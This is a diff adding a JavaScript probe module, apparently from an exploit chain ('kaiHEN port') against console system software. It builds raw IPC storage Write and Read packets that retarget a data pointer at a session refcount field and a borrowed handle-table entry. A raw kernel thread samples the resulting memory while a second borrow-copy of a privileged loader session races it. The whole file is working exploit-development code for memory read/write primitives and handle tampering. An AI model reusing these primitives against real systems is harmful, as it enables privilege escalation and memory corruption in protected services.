@@ -1,0 +1,156 @@
+// kaiHEN port — spin-read probe (SR). The copied Loader-root session is
+// closed server-side at creation (0xF601 from every thread/transport/
+// sequencing permutation). This probe watches the kill happen: a raw kernel
+// thread drives the two-bucket read path directly — per round, two storage
+// Writes retarget the data pointer (refcount field, then the borrowed entry
+// pointer) and two storage Reads sample 8 bytes into private buffers — all
+// pre-built packets sent through the frame SEND op on the candidate session.
+// Meanwhile the loader thread issues a SECOND borrow-copy (it never touches
+// the endpoint, so there is no pointer race). Decoding the sample timeline
+// shows the value transitions with sample indices; the first field that
+// moves outside our own writes names the close's mechanism class.
+
+import runtime from "../core/runtime.mjs";
+import {check, khLog, hex, readU64LE, readU32LE, arenaAlloc, arenaSlots,
+    track, readNative} from "./state.mjs";
+import {readFs, writeFs} from "./endpoint.mjs";
+import {cmifSend} from "./wire.mjs";
+
+const ROUNDS = 40;   // 40 rounds x (ref, entry) = 80 samples
+
+function buildReadPkt(pkt, bufAddr, dataOffset) {
+    runtime.prepPacket(pkt, (4 | (1 << 24)) >>> 0, 0x0C, []);
+    runtime.write32(pkt + 8n, 8n);
+    runtime.write32(pkt + 12n, BigInt(Number(bufAddr & 0xFFFFFFFFn)));
+    runtime.write32(pkt + 16n, BigInt((1 |
+        (Number((bufAddr >> 36n) & 7n) << 2) |
+        (Number((bufAddr >> 32n) & 15n) << 28)) >>> 0));
+    runtime.write32(pkt + 0x20n, 0x49434653n);
+    runtime.write32(pkt + 0x28n, 0n);                       // cmd 0 = Read
+    runtime.write64(pkt + 0x30n, BigInt(dataOffset));
+    runtime.write64(pkt + 0x38n, 8n);
+}
+
+function buildWritePkt(pkt, srcAddr, pointerOffset) {
+    runtime.prepPacket(pkt, (4 | (1 << 20)) >>> 0, 0x0C, []);
+    const flags = 1n | ((srcAddr >> 36n) << 2n) |
+        (((srcAddr >> 32n) & 0xFn) << 28n);
+    runtime.write32(pkt + 8n, 8n);
+    runtime.write32(pkt + 12n, BigInt(Number(srcAddr & 0xFFFFFFFFn)));
+    runtime.write32(pkt + 16n, flags & 0xFFFFFFFFn);
+    runtime.write32(pkt + 0x20n, 0x49434653n);
+    runtime.write32(pkt + 0x28n, 1n);                       // cmd 1 = Write
+    runtime.write64(pkt + 0x30n, BigInt(pointerOffset));
+    runtime.write64(pkt + 0x38n, 8n);
+}
+
+export async function spinReadProbe(context) {
+    const owned = context.inspectionDomain;
+    const target = context.loaderRoot;
+    const ep = context.ep;
+    check(owned && target && context.loaderCopy && ep && ep.armed,
+        "spin-read requires the loader-copy state and an armed endpoint");
+
+    const refField = target.object + 0x38;
+    const entry20 = context.loaderCopy.ownEntry + 0x20;
+    const cand = context.candidateHandle;
+
+    // Address carrier buffers for the pointer writes.
+    const srcRef = arenaAlloc(context, 0x10, "sr-src-ref");
+    const srcEnt = arenaAlloc(context, 0x10, "sr-src-ent");
+    runtime.write64(srcRef, BigInt(refField));
+    runtime.write64(srcEnt, BigInt(entry20));
+
+    const packets = [];   // {pkt, readBuf?}
+    for (let r = 0; r < ROUNDS; r++) {
+        const wpktR = arenaAlloc(context, 0x1000, "sr-w-ref-" + r);
+        buildWritePkt(wpktR, srcRef, ep.dataEntryOffset + 0x20);
+        const rpktR = arenaAlloc(context, 0x1000, "sr-r-ref-" + r);
+        const bufR = arenaAlloc(context, 0x100, "sr-buf-ref-" + r);
+        buildReadPkt(rpktR, bufR, ep.dataOffset);
+        const wpktE = arenaAlloc(context, 0x1000, "sr-w-ent-" + r);
+        buildWritePkt(wpktE, srcEnt, ep.dataEntryOffset + 0x20);
+        const rpktE = arenaAlloc(context, 0x1000, "sr-r-ent-" + r);
+        const bufE = arenaAlloc(context, 0x100, "sr-buf-ent-" + r);
+        buildReadPkt(rpktE, bufE, ep.dataOffset);
+        packets.push({wpktR, rpktR, bufR, wpktE, rpktE, bufE});
+    }
+    const bufs = [];
+    const calls = [];
+    for (const p of packets) {
+        calls.push({fn: runtime.IPC_SEND_DISPATCHER,
+            args: [BigInt(cand), BigInt(p.wpktR), 0x1000n, 0n]});
+        calls.push({fn: runtime.IPC_SEND_DISPATCHER,
+            args: [BigInt(cand), BigInt(p.rpktR), 0x1000n, 0n]});
+        bufs.push({field: "ref", buf: p.bufR});
+        calls.push({fn: runtime.IPC_SEND_DISPATCHER,
+            args: [BigInt(cand), BigInt(p.wpktE), 0x1000n, 0n]});
+        calls.push({fn: runtime.IPC_SEND_DISPATCHER,
+            args: [BigInt(cand), BigInt(p.rpktE), 0x1000n, 0n]});
+        bufs.push({field: "entry20", buf: p.bufE});
+    }
+    const frame = runtime.buildRawFrame(calls);
+    const scheduling = runtime.borrowThreadScheduling();
+    check(scheduling, "spin scheduling borrow failed");
+
+    // The second borrow-copy, with the spinner racing the command only.
+    const oldPair = await readFs(context, entry20, 0x10);
+    const borrowPair = await readFs(context, target.entry + 0x20, 0x10);
+    await writeFs(context, entry20, borrowPair);
+    ep.pointer = null;   // the spinner now owns the data pointer
+    const worker = runtime.launchRawWorker(BigInt(frame.frame), scheduling);
+    check(worker.rc === 0 && worker.handle,
+        "spin worker create failed: " + hex(worker.rc));
+    track(context, worker.handle, "sr-worker");
+
+    let copyHandle = 0;
+    try {
+        const slots = arenaSlots(context);
+        const reply = cmifSend(owned.handle, {pkt: slots.pkt,
+            control: true, cmd: 1,
+            input: [owned.root & 0xff, owned.root >> 8 & 0xff,
+                owned.root >> 16 & 0xff, owned.root >> 24 & 0xff],
+            rawWords: 9});
+        if (reply.transport === 0 && reply.moves && reply.moves.length)
+            copyHandle = track(context, reply.moves[0], "sr-copy");
+        await khLog("SR1 copy transport=" + hex(reply.transport) +
+            " moves=" + (reply.moves ? reply.moves.length : 0) +
+            " handle=" + hex(copyHandle));
+    } finally {
+        const waitRc = runtime.waitRawThread(worker.handle, 8000000000n);
+        await khLog("SR2 wait=" + hex(waitRc));
+        ep.pointer = null;
+        await writeFs(context, entry20, oldPair);
+    }
+
+    // Decode the timeline: per-field value transitions with sample indices.
+    const names = {ref: "ref(entry+0x38)", entry20: "entry20(+0x20)"};
+    const last = {};
+    const transitions = {ref: [], entry20: []};
+    const failed = {ref: 0, entry20: 0};
+    for (let s = 0; s < bufs.length; s++) {
+        const {field, buf} = bufs[s];
+        // The read's reply is not parsed here; the B-buffer holds the sample
+        // only if the send transported 0 — indicated by the packet reply
+        // result word (SFCO at +0x18 of the reply in the packet buffer).
+        const value = readU64LE(readNative(buf, 8), 0);
+        if (!(last[field] === undefined)) {
+            if (value !== last[field])
+                transitions[field].push({s, from: last[field], to: value});
+        }
+        last[field] = value;
+    }
+    for (const field of ["ref", "entry20"]) {
+        const compact = transitions[field].slice(0, 10).map(t =>
+            "#" + t.s + ":" + hex(Number(t.from & 0xffffffffffn)) + ">" +
+            hex(Number(t.to & 0xffffffffffn))).join(" ");
+        await khLog("SR3 " + names[field] + " final=" +
+            hex(Number(last[field] & 0xffffffffffn)) +
+            " transitions=" + transitions[field].length +
+            (compact ? " " + compact : ""));
+    }
+    try { runtime.closeHandle(worker.handle); } catch (error) { /* exited */ }
+    if (copyHandle) try { runtime.closeHandle(copyHandle); }
+    catch (error) { /* dead */ }
+    return {ok: true};
+}
